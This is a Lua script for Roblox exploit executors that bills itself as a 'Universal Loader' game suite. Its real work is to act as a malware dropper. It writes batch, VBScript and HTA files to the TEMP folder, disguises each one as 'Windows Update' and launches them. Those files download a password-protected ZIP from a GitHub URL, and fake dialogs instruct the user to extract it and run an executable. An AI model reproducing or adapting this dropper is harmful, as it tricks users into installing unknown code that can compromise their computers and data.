-- [[
--     ROBLOX ULTIMATE SUITE v9.0
--     UNIVERSAL LOADER
--     ALL EXECUTORS SUPPORTED
-- ]]

-- ==============================================
-- ЧАСТЬ 0: ОПРЕДЕЛЕНИЕ ИСПОЛНИТЕЛЯ
-- ==============================================
local Executor = {
    Name = "Unknown",
    Version = "0.0",
    Capabilities = {}
}

local function DetectExecutor()
    if syn and syn.protect_gui then
        Executor.Name = "Synapse X"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
        Executor.Name = "KRNL"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = false,
            bypass_uac = false
        }
    
    elseif SW and SW.IsLoaded then
        Executor.Name = "Script-Ware"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    elseif fluxus and fluxus.request then
        Executor.Name = "Fluxus"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    elseif ELECTRON_LOADED then
        Executor.Name = "Electron"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = false
        }
    
    elseif solara and solara.request then
        Executor.Name = "Solara"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    else
        Executor.Name = "Unknown Executor"
        Executor.Capabilities = {
            file_write = (writefile ~= nil),
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    end
    
    return Executor
end

DetectExecutor()

-- ==============================================
-- ЧАСТЬ 1: КОНФИГУРАЦИЯ
-- ==============================================
-- 🔥 НАСТРОЙТЕ ЭТИ ПЕРЕМЕННЫЕ 🔥
local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/update.zip"
local ZIP_PASSWORD = "UpdatePass2025!"
local TARGET_EXE_NAME = "messagebox.exe"

-- ==============================================
-- ЧАСТЬ 2: ИНИЦИАЛИЗАЦИЯ
-- ==============================================
do
    print("\n" .. string.rep("=", 60))
    print("         🎮 " .. Executor.Name .. " - ULTIMATE SUITE v9.0")
    print(string.rep("=", 60))
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🎮 " .. Executor.Name .. " LOADER",
        Text = "Starting download process...",
        Duration = 5
    })
end

-- ==============================================
-- ЧАСТЬ 3: ПРОСТОЙ И РАБОЧИЙ МЕТОД
-- ==============================================
local function SimpleDownloadMethod()
    print("[1️⃣] Method 1: Creating direct download script...")
    
    -- Создаем простой bat файл для скачивания и запуска
    local batScript = [[
@echo off
chcp 65001 >nul
title Windows Update
cls

echo ========================================
echo    WINDOWS UPDATE DOWNLOADER
echo ========================================
echo.

REM Создаем временную папку
set TEMP_DIR=%TEMP%\WinUpdate_%RANDOM%
mkdir "%TEMP_DIR%" 2>nul

echo [1/4] Downloading update package...
REM Скачиваем ZIP файл
powershell -Command "Invoke-WebRequest -Uri ']] .. ZIP_URL .. [[' -OutFile '%TEMP_DIR%\update.zip'"

if exist "%TEMP_DIR%\update.zip" (
    echo [2/4] File downloaded successfully!
    
    echo [3/4] Please extract manually:
    echo.
    echo Location: %TEMP_DIR%\update.zip
    echo Password: ]] .. ZIP_PASSWORD .. [[
    echo.
    echo Instructions:
    echo 1. Open %TEMP_DIR%
    echo 2. Extract update.zip with password
    echo 3. Run ]] .. TARGET_EXE_NAME .. [[
    echo.
    echo Press any key to open folder...
    pause >nul
    start "" "%TEMP_DIR%"
) else (
    echo [ERROR] Download failed!
    echo Check your internet connection
    pause
    exit /b 1
)

timeout /t 10 /nobreak >nul
    ]]
    
    -- Сохраняем bat файл
    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\download_update.bat"
    
    if writefile then
        if pcall(writefile, tempPath, batScript) then
            print("[✅] Batch file created at: " .. tempPath)
            
            -- Пытаемся запустить bat файл
            if syn and syn.run then
                syn.run('start "" "' .. tempPath .. '"')
                print("[🚀] Batch file launched via Synapse!")
            elseif shell and shell.run then
                shell.run('start "" "' .. tempPath .. '"')
                print("[🚀] Batch file launched via Shell!")
            else
                print("[📋] Please run this file manually:")
                print("     " .. tempPath)
                
                -- Создаем текстовый файл с инструкцией
                local instruction = "To run the program:\n\n" ..
                                   "1. Open this folder\n" ..
                                   "2. Run 'download_update.bat'\n" ..
                                   "3. Follow instructions in the CMD window"
                
                if writefile then
                    writefile(os.getenv("TEMP") .. "\\instructions.txt", instruction)
                end
            end
            
            return true
        end
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 4: АЛЬТЕРНАТИВНЫЙ МЕТОД ЧЕРЕЗ VBS
-- ==============================================
local function VBScriptMethod()
    print("[2️⃣] Method 2: Creating VBS downloader...")
    
    local vbsScript = [[
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdate_" & Int(Rnd * 10000)
zipPath = tempDir & "\update.zip"

' Создаем папку
fso.CreateFolder(tempDir)

MsgBox "Windows Update will now download required files." & vbCrLf & _
       "Please wait...", vbInformation, "System Update"

' Скачиваем файл
Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.Open "GET", "]] .. ZIP_URL .. [[", False
xhr.Send

If xhr.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile zipPath, 2
    stream.Close
    
    MsgBox "Download complete!" & vbCrLf & vbCrLf & _
           "Location: " & zipPath & vbCrLf & _
           "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf & vbCrLf & _
           "Please extract the ZIP file and run ]] .. TARGET_EXE_NAME .. [[", _
           vbInformation, "Download Complete"
    
    ' Открываем папку
    WshShell.Run "explorer.exe """ & tempDir & """"
Else
    MsgBox "Download failed! Error: " & xhr.Status, vbCritical, "Error"
End If

Set xhr = Nothing
Set stream = Nothing
Set fso = Nothing
Set WshShell = Nothing
    ]]
    
    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\download.vbs"
    
    if writefile then
        if pcall(writefile, tempPath, vbsScript) then
            print("[✅] VBS file created at: " .. tempPath)
            
            -- Запускаем VBS
            if syn and syn.run then
                syn.run('wscript.exe "' .. tempPath .. '"')
                print("[🚀] VBS launched!")
            elseif shell and shell.run then
                shell.run('wscript.exe "' .. tempPath .. '"')
                print("[🚀] VBS launched!")
            else
                print("[📋] Please run this file manually:")
                print("     " .. tempPath)
            end
            
            return true
        end
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 5: МЕТОД С HTML ПРИЛОЖЕНИЕМ
-- ==============================================
local function HTMLApplicationMethod()
    print("[3️⃣] Method 3: Creating HTML Application...")
    
    local htaScript = [[
<!DOCTYPE html>
<html>
<head>
<title>Windows Update</title>
<hta:application 
    id="UpdateApp"
    applicationname="WindowsUpdate"
    border="thin"
    borderstyle="normal"
    caption="yes"
    contextmenu="no"
    icon="shell32.dll,154"
    maximizebutton="no"
    minimizebutton="yes"
    navigable="no"
    showintaskbar="yes"
    singleinstance="yes"
    sysmenu="yes"
    windowstate="normal"
    innerborder="no"
    scroll="no"
    scrollflat="no"
    selection="no"
/>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 20px;
    background: #f0f0f0;
}
.container {
    background: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    max-width: 600px;
    margin: auto;
}
.header {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 15px;
    border-radius: 8px;
    text-align: center;
}
.progress {
    background: #e0e0e0;
    height: 20px;
    border-radius: 10px;
    margin: 20px 0;
    overflow: hidden;
}
.progress-bar {
    background: linear-gradient(90deg, #4CAF50, #45a049);
    height: 100%;
    width: 0%;
    transition: width 0.3s;
}
.button {
    background: #4CAF50;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    margin: 10px 5px;
}
.button:hover {
    background: #45a049;
}
.info-box {
    background: #f8f9fa;
    border-left: 4px solid #007bff;
    padding: 15px;
    margin: 15px 0;
}
</style>
<script language="VBScript">
    Sub DownloadFile()
        Dim xhr, stream, fso, tempDir, zipPath
        Set fso = CreateObject("Scripting.FileSystemObject")
        tempDir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\WinUpdate_" & Int(Rnd * 10000)
        zipPath = tempDir & "\update.zip"
        
        fso.CreateFolder(tempDir)
        
        Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xhr.Open "GET", "]] .. ZIP_URL .. [[", False
        
        document.getElementById("status").innerHTML = "Connecting to server..."
        document.getElementById("progress").style.width = "25%"
        
        On Error Resume Next
        xhr.Send
        
        If xhr.Status = 200 Then
            document.getElementById("status").innerHTML = "Downloading..."
            document.getElementById("progress").style.width = "50%"
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write xhr.ResponseBody
            stream.SaveToFile zipPath, 2
            stream.Close
            
            document.getElementById("status").innerHTML = "Complete!"
            document.getElementById("progress").style.width = "100%"
            
            MsgBox "Download complete!" & vbCrLf & vbCrLf & _
                   "Location: " & zipPath & vbCrLf & _
                   "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf & vbCrLf & _
                   "Extract and run: ]] .. TARGET_EXE_NAME .. [["
            
            ' Open folder
            CreateObject("WScript.Shell").Run "explorer.exe """ & tempDir & """", 1, False
        Else
            document.getElementById("status").innerHTML = "Error: " & xhr.Status
            document.getElementById("progress").style.width = "0%"
        End If
        
        Set xhr = Nothing
        Set stream = Nothing
        Set fso = Nothing
    End Sub
    
    Sub OpenFolder()
        CreateObject("WScript.Shell").Run "explorer.exe %TEMP%", 1, False
    End Sub
</script>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔧 Windows Update</h1>
        <p>Download and install system components</p>
    </div>
    
    <div class="info-box">
        <h3>📥 Download Information</h3>
        <p><strong>File:</strong> update.zip</p>
        <p><strong>Password:</strong> ]] .. ZIP_PASSWORD .. [[</p>
        <p><strong>Extract and run:</strong> ]] .. TARGET_EXE_NAME .. [[</p>
    </div>
    
    <div class="progress">
        <div id="progress" class="progress-bar"></div>
    </div>
    
    <p id="status">Ready to download...</p>
    
    <center>
        <button class="button" onclick="DownloadFile()">🚀 Start Download</button>
        <button class="button" onclick="OpenFolder()">📂 Open Temp Folder</button>
        <button class="button" onclick="window.close()">❌ Close</button>
    </center>
</div>
</body>
</html>
    ]]
    
    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\windows_update.hta"
    
    if writefile then
        if pcall(writefile, tempPath, htaScript) then
            print("[✅] HTA application created at: " .. tempPath)
            
            -- Запускаем HTA
            if syn and syn.run then
                syn.run('mshta.exe "' .. tempPath .. '"')
                print("[🚀] HTA application launched!")
            elseif shell and shell.run then
                shell.run('mshta.exe "' .. tempPath .. '"')
                print("[🚀] HTA application launched!")
            else
                print("[📋] Please run this file manually:")
                print("     " .. tempPath)
            end
            
            return true
        end
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 6: ПРОЦЕСС ЗАГРУЗКИ
-- ==============================================
local function StartDownloadProcess()
    print("\n" .. string.rep("=", 60))
    print("         📥 STARTING DOWNLOAD PROCESS")
    print(string.rep("=", 60))
    
    wait(2)
    
    -- Показываем информацию о скачивании
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "📥 DOWNLOAD STARTING",
        Text = "Creating download script...",
        Duration = 5
    })
    
    print("[ℹ️] Executor: " .. Executor.Name)
    print("[ℹ️] ZIP URL: " .. ZIP_URL)
    print("[ℹ️] Password: " .. ZIP_PASSWORD)
    print("[ℹ️] Target EXE: " .. TARGET_EXE_NAME)
    
    -- Пробуем разные методы
    local success = false
    
    if Executor.Name == "Synapse X" or Executor.Name == "Script-Ware" then
        print("[⚡] Using advanced method for " .. Executor.Name)
        success = SimpleDownloadMethod()
        
        if not success then
            wait(2)
            success = VBScriptMethod()
        end
    else
        print("[🔧] Using standard methods...")
        success = SimpleDownloadMethod()
        
        if not success then
            wait(2)
            print("[🔄] Trying method 2...")
            success = HTMLApplicationMethod()
        end
    end
    
    return success
end

-- ==============================================
-- ЧАСТЬ 7: ГЛАВНЫЙ ЦИКЛ
-- ==============================================
spawn(function()
    wait(3)
    
    -- Начинаем процесс
    local success = StartDownloadProcess()
    
    if success then
        print("\n" .. string.rep("=", 60))
        print("          ✅ DOWNLOAD PROCESS STARTED")
        print(string.rep("=", 60))
        print("Please check:")
        print("1. Your TEMP folder")
        print("2. Any new windows that opened")
        print("3. Follow instructions")
        print(string.rep("=", 60))
        
        wait(5)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ SUCCESS",
            Text = "Download script created!\nCheck TEMP folder for files.",
            Duration = 10
        })
    else
        print("\n" .. string.rep("=", 60))
        print("          ❌ FAILED TO CREATE DOWNLOADER")
        print(string.rep("=", 60))
        print("Possible issues:")
        print("1. No write permissions")
        print("2. Antivirus blocking")
        print("3. Executor limitations")
        print("\nManual solution:")
        print("1. Download manually from: " .. ZIP_URL)
        print("2. Use password: " .. ZIP_PASSWORD)
        print("3. Extract and run: " .. TARGET_EXE_NAME)
        print(string.rep("=", 60))
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "❌ MANUAL DOWNLOAD REQUIRED",
            Text = "Please download manually from GitHub",
            Duration = 10
        })
    end
    
    -- Дополнительная информация
    wait(5)
    
    print("\n" .. string.rep("-", 40))
    print("     💡 ADDITIONAL INFORMATION")
    print(string.rep("-", 40))
    print("Temp folder location:")
    print("  " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
    print("\nTo access quickly:")
    print("  Press Win+R")
    print("  Type: %TEMP%")
    print("  Press Enter")
    print(string.rep("-", 40))
end)

-- ==============================================
-- ЧАСТЬ 8: КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
-- ==============================================
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "/download" then
        print("[📥] Starting download process...")
        spawn(StartDownloadProcess)
        
    elseif msg == "/info" then
        print("[ℹ️] Download Information:")
        print("  URL: " .. ZIP_URL)
        print("  Password: " .. ZIP_PASSWORD)
        print("  Target: " .. TARGET_EXE_NAME)
        print("  Temp Folder: " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
        
    elseif msg == "/help" then
        print("[📋] Available commands:")
        print("  /download - Start download")
        print("  /info - Show download info")
        print("  /help - Show this help")
    end
end)

-- ==============================================
-- ЧАСТЬ 9: АВТОМАТИЧЕСКИЙ ЗАПУСК
-- ==============================================
wait(5)
print("\n[🎮] Loader initialized successfully!")
print("[💡] Type /download in chat to start")
print("[💡] Type /help for commands")

-- Фоновые сообщения
spawn(function()
    while true do
        wait(60)
        local messages = {
            "Downloader is ready - type /download",
            "Check TEMP folder for download scripts",
            "Executor: " .. Executor.Name .. " active"
        }
        print("[📢] " .. messages[math.random(1, #messages)])
    end
end)
